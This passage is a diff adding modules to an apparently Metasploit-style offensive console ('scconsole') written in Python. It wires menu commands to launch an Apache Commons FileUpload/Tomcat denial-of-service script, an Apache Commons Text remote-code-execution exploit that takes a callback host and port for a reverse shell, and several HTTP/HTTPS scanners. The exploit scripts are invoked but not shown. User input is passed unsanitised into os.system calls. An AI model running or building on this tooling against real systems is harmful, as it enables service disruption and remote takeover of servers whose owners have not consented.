+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        dosApacheCommonsFileUploadandApacheTomcatDoS()
+    elif scconsole129 == "clear":
+        os.system('clear')
+        dosApacheCommonsFileUploadandApacheTomcatDoS()
+    elif scconsole129 == "show options":
+        print("""
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+URL           | specify the target url.
+N_REQUESTS    | specify the number of requests (default 10).
+
+you will specifiy these options when you run or exploit it!
+""")
+        dosApacheCommonsFileUploadandApacheTomcatDoS()
+    elif scconsole129 == "run":
+        targeturltodos = input("Enter target URL: ")
+        numberofrequests = int(input("Enter the number of requests: "))
+        os.system(f'ruby exploits/dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS.rb -u {targeturltodos} -n {numberofrequests}')
+        dosApacheCommonsFileUploadandApacheTomcatDoS()
+    elif scconsole129 == "exploit":
+        targeturltodos2 = input("Enter target URL: ")
+        numberofrequests2 = int(input("Enter the number of requests: "))
+        os.system(f'ruby exploits/dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS.rb -u {targeturltodos2} -n {numberofrequests2}')
+        dosApacheCommonsFileUploadandApacheTomcatDoS()
+    elif scconsole129 == "unuse":
+        print("unusing dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole129 == "exit":
+        exit()
+
+def siteApachecommonstextRCE():
+    scconsole130 = input("sc~" + color.red + "(site/Apache_commons_text_RCE)" + color.white + ">")
+    if scconsole130 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        siteApachecommonstextRCE()
+    elif scconsole130 == "clear":
+        os.system('clear')
+        siteApachecommonstextRCE()
+    elif scconsole130 == "show options":
+        print("""
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+TARGET_IP     | specify the target ip address.
+LHOST         | specify the listening host.
+LPORT         | specify the listening port.
+
+you will specifiy these options when you run or exploit it!
+""")
+        siteApachecommonstextRCE()
+    elif scconsole130 == "run":
+        targethostip = input("Enter target ip address: ")
+        callbackip = input("Enter the callback ip address(listening host): ")
+        callbackport = input("Enter the callback port(listening port): ")
+        os.system(f'python exploits/site/Apache_commons_text_RCE.py {targethostip} {callbackip} {callbackport}')
+        siteApachecommonstextRCE()
+    elif scconsole130 == "exploit":
+        targethostip2 = input("Enter target ip address: ")
+        callbackip2 = input("Enter the callback ip address(listening host): ")
+        callbackport2 = input("Enter the callback port(listening port): ")
+        os.system(f'python exploits/site/Apache_commons_text_RCE.py {targethostip2} {callbackip2} {callbackport2}')
+        siteApachecommonstextRCE()
+    elif scconsole130 == "unuse":
+        print("unusing site/Apache_commons_text_RCE.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole130 == "exit":
+        exit()
+
+def scannerhttpoptions():
+    scconsole131 = input("sc~" + color.red + "(scanner/http-options)" + color.white + ">")
+    if scconsole131 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        scannerhttpoptions()
+    elif scconsole131 == "clear":
+        os.system('clear')
+        scannerhttpoptions()
+    elif scconsole131 == "show options":
+        print("""
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+RHOST         | specify the target url.
+
+you will specifiy these options when you run or exploit it!
+""")
+        scannerhttpoptions()
+    elif scconsole131 == "run":
+        targethostip3 = input("Enter target url: ")
+        os.system(f'python exploits/scanner/http-options.py --rhost {targethostip3}')
+        scannerhttpoptions()
+    elif scconsole131 == "exploit":
+        targethostip4 = input("Enter target url: ")
+        os.system(f'python exploits/scanner/http-options.py --rhost {targethostip4}')
+        scannerhttpoptions()
+    elif scconsole131 == "unuse":
+        print("unusing scanner/http-options.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole131 == "exit":
+        exit()
+
+def scannerhttpsoptions():
+    scconsole132 = input("sc~" + color.red + "(scanner/https-options)" + color.white + ">")
+    if scconsole132 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        scannerhttpsoptions()
+    elif scconsole132 == "clear":
+        os.system('clear')
+        scannerhttpsoptions()
+    elif scconsole132 == "show options":
+        print("""
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+RHOST         | specify the target url.
+
+you will specifiy these options when you run or exploit it!
+""")
+        scannerhttpsoptions()
+    elif scconsole132 == "run":
+        targethostip5 = input("Enter target url: ")
+        os.system(f'python exploits/scanner/https-options.py --rhost {targethostip5}')
+        scannerhttpsoptions()
+    elif scconsole132 == "exploit":
+        targethostip6 = input("Enter target url: ")
+        os.system(f'python exploits/scanner/https-options.py --rhost {targethostip6}')
+        scannerhttpsoptions()
+    elif scconsole132 == "unuse":
+        print("unusing scanner/https-options.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole132 == "exit":
+        exit()
+
+def scannerserverscanner():
+    scconsole133 = input("sc~" + color.red + "(scanner/server-scanner)" + color.white + ">")
+    if scconsole133 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        scannerserverscanner()
+    elif scconsole133 == "clear":
+        os.system('clear')
+        scannerserverscanner()
+    elif scconsole133 == "show options":
+        print("""
+OPTIONS       | DISCREPTIONS
+--------------|----------------------
+RHOST         | specify the target url.
+
+you will specifiy these options when you run or exploit it!
+""")
+        scannerserverscanner()
+    elif scconsole133 == "run":
+        os.system('python exploits/scanner/server-scanner.py')
+        scannerserverscanner()
+    elif scconsole133 == "exploit":
+        os.system('python exploits/scanner/server-scanner.py')
+        scannerserverscanner()
+    elif scconsole133 == "unuse":
+        print("unusing scanner/server-scanner.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole133 == "exit":
         exit()
 
 def OSconsole():
